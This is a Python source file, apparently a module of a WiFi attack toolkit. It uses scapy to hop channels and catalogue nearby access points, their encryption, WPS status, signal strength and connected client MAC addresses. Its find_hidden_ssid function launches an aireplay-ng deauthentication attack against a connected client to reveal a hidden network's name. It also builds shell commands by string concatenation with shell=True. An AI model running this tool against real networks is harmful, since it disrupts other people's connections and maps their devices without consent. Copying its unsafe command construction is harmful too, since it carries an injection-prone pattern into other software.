from scapy.all import *
from scapy.layers.dot11 import Dot11Beacon
import time
import os
from core import functions
from tabulate import tabulate
from termcolor import colored # needed for colored print

class Target:
	def __init__(self, ssid, bssid, channel, encryption, power, wps):
		self.bssid = bssid
		self.channel = channel
		self.encryption = encryption
		self.ssid = ssid
		self.power = power
		self.wps = wps
		self.clients = []
		self.hidden = '' # assume always false

class Client:
	def __init__(self, ssid, bssid, channel, network):
		self.ssid = ssid
		self.bssid = bssid
		self.channel = channel
		self.network = network


# Function to change nic wireless channel -> find networks on different channels
def sniff_channel_hop(interface,targets,hidden_networks, mode):
	# for loop to hop over different channels
	for i in range(1, 14):
		subprocess.Popen("iwconfig " + interface + " channel " + repr(i), shell=True) # hop between channels
		print colored ("\n [*] Scanning Channel " + repr(i) + "...",'cyan'),
		sys.stdout.write("\033[F") # Cursor up one line
		sniff(iface=interface, count = 15, prn=scan_for_networks(targets,interface,hidden_networks, mode))



# Function to sniff for wireless networks
def scan_for_networks(targets,interface,hidden_networks, mode):
	
	# Nested function needed to pass multiple values in scapy
	def nested_scan_for_networks(pkt):
		
		# Detect Networks
		if pkt.haslayer(Dot11Beacon):
			
			# Check if network is Hidden --> Add To Hidden Network_List
			if not pkt.info or ((all('\x00' == c for c in pkt.info)) or (all(ord(c) == 0 for c in pkt.info)) or (pkt.info == '\x00'*len(pkt.info))):
				ssid = "Hidden Network" #set the ssid to hidden network
				
				# Check if the bssid is already is the hidden network list
				if not any((element.bssid.upper() == pkt.addr2.upper()) for element in targets): # if the bssid is not already in the hidden network list then append
					hidden_networks.add(pkt.addr3)
			else:
				ssid = pkt.info # network name
					
			
			
			# Extract the relevant network info
			bssid = pkt.addr2 																				  # network mac address
			channel = int( ord(pkt[Dot11Elt:3].info)) 														  # network channel
			capability = pkt.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}\{Dot11ProbeResp:%Dot11ProbeResp.cap%}") # record beacons and there responses
			
			
			# Check Network Encryption Type
			if "privacy" not in capability: 																  # Check if the network is Open or encrypted 
				encryption = "OPEN" 																		  # if encoding header is not found in the wireless network found
			else: 																							  # encryption header found --> assume WEP until confirmed otherwise
				encryption = "WEP"

			wps = "No" 																						  # always assume wps is disabled by default unless ID is detected in the packed
			p = pkt.getlayer(Dot11Elt)
			while p:
				if p.ID == 48:																				  # check if wpa2
					encryption = "WPA2"
				elif p.ID == 221 and p.info.startswith('\x00P\xf2\x01\x01\x00'):							  # Check if wpa
					encryption = "WPA"
				elif p.ID == 221 and p.info.startswith('\x00\x50\xF2\x04'): 								  # check for wps
					wps = "Yes"
				p = p.payload.getlayer(Dot11Elt)
				
			# Get the power/ signal strength
			noise = pkt.notdecoded
			power = (ord(noise[-2:-1])-256)
			if power < 0: power += 100
			
			# Create target instance and add it to the list
			t = Target(ssid, bssid, channel, encryption, power, wps)
			t.wps = wps
			# Check if network is already recorded in the list
			if not any((element.bssid.upper() == t.bssid.upper() and element.encryption.upper() == t.encryption.upper() and element.channel == t.channel and element.wps.upper() == t.wps.upper()) for element in targets): # if the bssid is not already in the hidden network list then append
				targets.append(t) 
			else:
				 for element in targets:
					 if (element.bssid.upper() == t.bssid.upper() and element.encryption.upper() == t.encryption.upper() and element.channel == t.channel and element.wps.upper() == t.wps.upper()):
						 element.power = t.power
						 
			
			

		# Detect Clients
		if pkt.haslayer(Dot11):
			if pkt.addr1 and pkt.addr2: # if mac addresses exist
				if pkt.addr1 != 'ff:ff:ff:ff:ff:ff' and '01:80:C2:00' not in str(pkt.addr1).upper() and '01:00:5E:' not in str(pkt.addr1).upper() and "33:33:" not in str(pkt.addr1).upper() : # ignore broadcast and multicast etc
					#print pkt.addr2 + " Has Client: " + pkt.addr1
					
					for ap in targets:
						if ap.bssid.lower() == pkt.addr2.lower():
							if pkt.type in [1,2]:
								if pkt.addr1.upper() not in ap.clients:
									ap.clients.append(pkt.addr1.upper())
							
			
		find_hidden_ssid(pkt, interface, targets, hidden_networks,mode)
	return nested_scan_for_networks
	
# Sort List In order of Power
def sort_list(temp_list):
	network_list = sorted(temp_list, key = lambda x: x.power, reverse = True) # sort list by power rating
	return network_list


# Function to Find Hidden Networks
def find_hidden_ssid(packet, interface, targets, hidden_networks, mode):
	# If packet is responding to a probe request and the ssid is in the hidden networks
	if packet.haslayer(Dot11ProbeResp) and (packet.addr3) in (hidden_networks):
		for element in targets:
			if element.bssid.upper() == packet.addr3.upper():
				element.ssid = packet.info
				element.hidden = "HIDDEN"
				hidden_networks.remove(element.bssid)

	# If it is a hidden network with an unknown name and it has clients connected to it, kick off one of the clients, should be able to get name from the next probe request
	elif packet.haslayer(Dot11Beacon) and packet.addr3 in hidden_networks and mode == 1:
		for element in targets:
			if packet.addr3 == element.bssid:
				if len(element.clients) > 0:
					vbssid = str(element.bssid)
					victim = str(element.clients[0])
					vchannel = str(element.channel)
					
					# Start Deauthentication Attack to get ssid
					print "Sending Deauth To Target: " + victim
					subprocess.Popen("iwconfig " + str(interface) + " channel " +  vchannel, shell=True).wait() # hop between channels
					subprocess.Popen(" aireplay-ng -0 10 -a " + vbssid + " -c " + victim + " " + str(interface), shell=True).wait()
					element.clients.remove(victim)
					print "element renoved"
					subprocess.Popen("iwconfig " + interface + " channel " + vchannel, shell=True).wait() # switch to the victims channel
					sniff(iface=str(interface), timeout=10, prn=scan_for_networks(targets,interface,hidden_networks, mode)) # listen for 8 seconds on that channel to see if client reconnects
					break
	else: 
		pass


# Function to Display Output to the user
def display_results(targets, hidden_networks, clients):
	targets = sort_list(targets) # sort the list by power rating
	discovered_hidden_list = []
	undiscovered_hidden_list = []
	functions.system_clear()
	print colored ("\n[*] Found " + repr(len(targets)) + " Networks, Clients: " + repr(len(clients)), 'yellow',attrs=['bold'])
	print colored("\n{: <3} {: <30} {: ^30} {: ^30} {: ^10} {: ^10} {: ^10} {: ^10} {: ^5}".format(*('','Access Points', 'BSSID', 'Channel', 'Encrypted', 'Power', 'WPS', 'Clients', ' ')),'blue',attrs=['bold'])
	
	# Print Normal Networks
	i=1
	j = 1
	for row in targets:
		if row.hidden == "HIDDEN":
			discovered_hidden_list.append(row)
		elif row.ssid == "Hidden Network":
			undiscovered_hidden_list.append(row)
		else:
			print colored ("{: <3} {: <30} {: ^30} {: ^30} {: ^10} {: ^10} {: ^10} {: ^10} {: ^5}".format(*(i,row.ssid, row.bssid.upper(), row.channel, row.encryption, row.power, row.wps, len(row.clients), row.hidden)),'green')
			i+=1
	
	# Print Hidden List With Discovered SSID's
	for row in discovered_hidden_list:
		print colored ("{: <3} {: <30} {: ^30} {: ^30} {: ^10} {: ^10} {: ^10} {: ^10} {: ^5}".format(*(i,row.ssid, row.bssid.upper(), row.channel, row.encryption, row.power, row.wps, len(row.clients), row.hidden)),'yellow')
		i+=1
			
			
	# Print Hidden List With Undiscovered SSID's
	for row in undiscovered_hidden_list:
		print colored ("{: <3} {: <30} {: ^30} {: ^30} {: ^10} {: ^10} {: ^10} {: ^10} {: ^5}".format(*(i,row.ssid, row.bssid.upper(), row.channel, row.encryption, row.power, row.wps, len(row.clients), row.hidden)),'magenta')
		i+=1
		
	if len(clients) > 0:
		print "\n"
		print colored("{: <3} {: ^30} {: ^30} {: ^30} {: ^10}".format(*('','Client Mac', 'Access Point','Network BSSID', 'Channel')),'blue',attrs=['bold'])
		# Print Clients
		for row in clients:
			print colored ("{: <3} {: ^30} {: ^30} {: ^30} {: ^10}".format(*(j,row.bssid, row.ssid, row.network.upper(), row.channel)),'green')
			j+=1
		clients = []
		
			

def parse_clients(clients, targets):
	print "calling parse clients"
	for element in targets:
		if len(element.clients) > 0:
			for client in element.clients:
				c = Client(element.ssid, client, element.channel, element.bssid)
				print "Element: ",
				print element.bssid
				print "Client: ",
				print c.network
				if not any((c.bssid.upper() == element2.bssid.upper() and element2.channel == c.channel for element2 in clients)): # if the bssid is not already in the hidden network list then append
					clients.append(c) 
				
	
		
				
def launch(interface, mode):
	targets = []
	clients = []
	hidden_networks = set()
	while True:
		try:
			# used for debugging print "STARTED NOW"
			sniff_channel_hop(interface, targets, hidden_networks, mode)
			parse_clients(clients, targets)
			display_results(targets, hidden_networks, clients)
		except KeyboardInterrupt:
			raise
	
